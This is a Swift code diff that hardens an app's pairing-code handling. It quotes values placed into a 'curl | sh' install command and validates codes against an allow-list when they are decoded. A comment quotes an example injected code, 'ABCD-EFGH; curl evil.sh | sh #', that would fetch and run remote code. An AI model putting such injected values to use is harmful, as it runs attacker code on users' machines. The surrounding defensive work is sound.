@@ -1079,7 +1079,10 @@ struct Board: Codable, Equatable, Sendable {
 // MARK: - PairCode
 
 struct PairCode: Codable, Equatable, Sendable {
-    /// Dash-grouped pairing code, e.g. "AB12-CD34".
+    /// Canonical `XXXX-XXXX` over the server's alphabet, e.g. "AB2C-DE3F".
+    /// Decoding guarantees it (see `init(from:)` below); the memberwise
+    /// initialiser is left for SessionStore's cache, which only ever rebuilds
+    /// a code that already came through the decoder.
     let code: String
     let expiresInSeconds: Int
 
@@ -1090,14 +1093,89 @@ struct PairCode: Codable, Equatable, Sendable {
     /// script URL stays on the default server even when the board is
     /// self-hosted: the board hands out `--url`, but the installer itself
     /// still has to be fetched from somewhere the phone knows is current.
+    /// That pin is also what stops a hostile board from running code on the
+    /// machine any other way — install.sh fetches only GitHub releases and
+    /// checks them against SHA256SUMS — so it must never follow the board.
+    ///
+    /// Both values are single-quoted (`shellQuoted`). That is the backstop,
+    /// not the fix: the code is validated where it is decoded and the origin
+    /// rebuilt where it is parsed, so the quotes never have anything to
+    /// escape. They are there so that loosening either check later cannot
+    /// reopen this. Quoted, the line is still exactly what install.sh's
+    /// argument loop expects: the user's shell strips the quotes before
+    /// `sh -s --` passes the words on, so install.sh sees `--code` and
+    /// `ABCD-EFGH` as the same two arguments it always did.
     ///
     /// PairSheet renders this in a wrapping Text, so the extra length costs a
     /// second line on a phone and nothing else.
     func command(for board: Board) -> String {
-        var command = "curl -fsSL \(Board.defaultServer.absoluteString)/install.sh | sh -s -- --code \(code)"
+        var command = "curl -fsSL \(Board.defaultServer.absoluteString)/install.sh | sh -s -- --code \(Self.shellQuoted(code))"
         if !board.isDefaultServer {
-            command += " --url \(board.baseURL.absoluteString)"
+            command += " --url \(Self.shellQuoted(board.baseURL.absoluteString))"
         }
         return command
+    }
+
+    /// `value` as one POSIX shell word: wrapped in single quotes, inside which
+    /// nothing is special, with each `'` in it written `'\''` (close, escaped
+    /// quote, reopen) — the same in sh, bash and zsh. fish also reads `\\` and
+    /// `\'` inside single quotes, which is one more reason the values quoted
+    /// here are validated first: neither can contain a backslash.
+    static func shellQuoted(_ value: String) -> String {
+        "'" + value.replacingOccurrences(of: "'", with: #"'\''"#) + "'"
+    }
+
+    /// The server's generator, exactly: eight characters of PAIR_CODE_ALPHABET
+    /// (src/store.ts; no I, L, O, 0 or 1), which app.ts renders `XXXX-XXXX`.
+    /// Equivalent to `^[A-HJKMNP-Z2-9]{4}-?[A-HJKMNP-Z2-9]{4}$`, checked a
+    /// character at a time the way `isValidToken` in API.swift checks a token
+    /// — and with none of the anchoring traps of an ICU pattern, whose `$`
+    /// also matches before a trailing newline.
+    private static let alphabet = Set("ABCDEFGHJKMNPQRSTUVWXYZ23456789")
+
+    /// The code as this app shows and copies it, or nil for anything the
+    /// server could not have minted.
+    ///
+    /// Why check what the server can only mint correctly: the app does not
+    /// only talk to that server. A board the user adds — self-hosted, a
+    /// colleague's, one in a QR — answers `POST /w/<token>/pair` with any
+    /// JSON it likes, and the code lands in a line the user is told to paste
+    /// into a terminal: `ABCD-EFGH; curl evil.sh | sh #` would have run, the
+    /// `#` commenting out the `--url` after it. On iOS a plain-HTTP board on
+    /// the LAN widens that to anyone who can rewrite its traffic. Against
+    /// agstatus.online it adds nothing (it already serves the install.sh the
+    /// line pipes into `sh`); against any other board it hands the operator
+    /// exactly the code execution the pinned installer otherwise denies them.
+    /// An allow-list, not a blocklist, for the reason the CLI's TOKEN_RE
+    /// (cli/src/api.ts) gives: a server must not be able to smuggle `$(...)`,
+    /// quotes or `;` through a value that reaches a shell.
+    static func canonical(_ raw: String) -> String? {
+        // ASCII first: outside it, uppercasing changes length or letter
+        // ("ſ".uppercased() is "S"), and nothing outside it is a code.
+        guard raw.allSatisfy(\.isASCII) else { return nil }
+        var bare = Array(raw.uppercased())
+        // Servers from before the display dash sent the eight bare.
+        if bare.count == 9, bare[4] == "-" { bare.remove(at: 4) }
+        guard bare.count == 8, bare.allSatisfy(alphabet.contains) else { return nil }
+        return String(bare[0..<4]) + "-" + String(bare[4..<8])
+    }
+}
+
+extension PairCode {
+    /// Validates where it is decoded, so a board that answers with anything
+    /// its server could not have minted never reaches the sheet or the
+    /// clipboard. The throw surfaces through `AgStatusAPI.decode` as
+    /// `APIError.badResponse(200)` — the Pair sheet's ordinary error view, the
+    /// same one any other unreadable answer gets. In an extension so the
+    /// memberwise initialiser survives.
+    init(from decoder: Decoder) throws {
+        let container = try decoder.container(keyedBy: CodingKeys.self)
+        let raw = try container.decode(String.self, forKey: .code)
+        guard let code = Self.canonical(raw) else {
+            throw DecodingError.dataCorruptedError(
+                forKey: .code, in: container,
+                debugDescription: "Not a pairing code this board's server could have minted")
+        }
+        self.init(code: code, expiresInSeconds: try container.decode(Int.self, forKey: .expiresInSeconds))
     }
 }
